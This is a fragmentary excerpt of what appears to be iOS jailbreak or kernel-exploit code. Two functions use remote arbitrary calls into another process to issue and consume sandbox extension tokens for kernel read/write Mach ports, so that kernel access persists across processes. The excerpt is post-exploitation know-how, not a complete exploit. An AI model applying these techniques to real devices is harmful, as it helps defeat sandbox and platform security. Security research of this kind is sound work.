...
bool transfer_krw_to_launchd(void) {
    ...
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    if (!tokenRemote) {
        printf("(persist) Failed to get token for RW_PORT_NAME\n");
    ...
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    if (!tokenRemote) {
        printf("(persist) Failed to get lookup token for CONTROL_PORT_NAME\n");
        [proc destroyRemoteCall];
        return false;
    }
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
    ...
    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
    if (!tokenRemote) {
        printf("(persist) Failed to get lookup token for RW_PORT_NAME\n");
        [proc destroyRemoteCall];
        return false;
    }
    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
...
bool recover_krw_primitives(void) {
    ...
    if (sandbox_extension_consume([primitive[@"ControlPort"] UTF8String] ?: "") < 0 ||
        sandbox_extension_consume([primitive[@"RWPort"] UTF8String] ?: "") < 0) {
        printf("(persist) sandbox_extension_consume failed — tokens may be expired\n");
    }
    
    kr = bootstrap_look_up(bootstrap_port, CONTROL_PORT_NAME, &control_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_look_up failed for control: %s\n", mach_error_string(kr));
        return false;
    }
    kr = bootstrap_look_up(bootstrap_port, RW_PORT_NAME, &rw_socketPort);
    if(kr != KERN_SUCCESS) {
        printf("(persist) bootstrap_look_up failed for rw: %s\n", mach_error_string(kr));
        return false;
    }
